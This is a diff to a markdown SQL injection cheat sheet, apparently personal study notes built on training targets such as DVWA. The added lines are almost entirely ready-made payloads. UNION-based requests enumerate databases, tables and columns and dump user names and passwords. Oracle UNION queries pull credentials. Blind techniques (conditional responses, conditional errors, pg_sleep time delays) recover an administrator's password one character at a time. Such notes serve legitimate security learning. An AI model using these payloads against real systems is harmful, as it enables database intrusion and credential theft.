@@ -86,7 +86,7 @@ Execution sink eval call error
 `xyz' OR 1=1--`
 
 
-### Cheatsheats
+## Cheatsheats
 
 |Title    | Concat  |  
 | --------- | ------------- |
@@ -194,19 +194,77 @@ Concat
 |MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  
 
 ### Enumeration
+MySQL
 
+ Find Tables
 
+`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,table_name+from+information_schema.tables%23&Submit=Submit HTTP/1.1`
 
+Find current DB
+        
+`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,database()%23&Submit=Submit HTTP/1.1`
 
+  Find All DB
+  
+`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,+schema_name+FROM+information_schema.schemata%23&Submit=Submit HTTP/1.1`
 
+ Find all DB tables
+        
+`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+table_schema,+table_name+from+information_schema.tables%23&Submit=Submit HTTP/1.1`
 
+ Find table columns
+        
+`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,+column_name+from+information_schema.columns+where+table_schema+%3d'dvwa'+and+table_name+%3d'users'%23&Submit=Submit HTTP/1.1`
 
+List table info
+        
+`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+user,+password+FROM+dvwa.users%23&Submit=Submit HTTP/1.1`
 
+ Using Concat_ws
+        
+`GET /DVWA/vulnerabilities/sqli/?id='+union+select+null,+concat_ws('%3a',first_name,last_name,user,password)+from+users+--+&Submit=Submit HTTP/1.1`
 
+  using group_concat
+        
+`GET /DVWA/vulnerabilities/sqli/?id='+union+select+null,+group_concat(concat_ws('%3a',first_name,last_name,user,password)+separator+'\n')+from+users+%23&Submit=Submit HTTP/1.1`
 
+Oracle
 
+`'+UNION+SELECT+table_name,NULL+FROM+all_tables+--+`
 
+`'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_LWSCID'+--+`
 
+`'+UNION+SELECT+USERNAME_MYUNOL,+PASSWORD_GETKJX+FROM+USERS_LWSCID+--+`
+
+## Blind  
+### Conditional Responses
+
+`TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>2--`
+
+in Intruder( step through substring for each character)
+
+`TrackingId=xyz'+UNION+SELECT+'a'+FROM+users+WHERE+username+=+'administrator'+and+SUBSTRING(Password,+5,+1)+=+'§a§'+--+`
+
+### Conditional Error
+
+Will error on 1/0 showing user administrator is a valid user  
+`xyz'+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+--+;`
+
+To find password lenght  
+`xyz'+UNION+SELECT+CASE+WHEN+(username+=+'administrator'+and+LENGTH(Password)+=+6)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+--`
+
+to find each password charater  
+`xyz'+UNION+SELECT+CASE+WHEN+(username+=+'administrator'+and+SUBSTR(Password,+1,+1)+=+'1')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+--+`
+
+### Time Delays
+
+`xyz'||pg_sleep(10)+--+`
+
+`xyz'||CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+`
+
+`xyz'%3b+SELECT+CASE+WHEN+(username+='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+Users+--`
+
+`xyz'%3b+SELECT+CASE+WHEN+(username+='administrator'+AND+length(Password)=6)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+Users+--+`
 
 
 
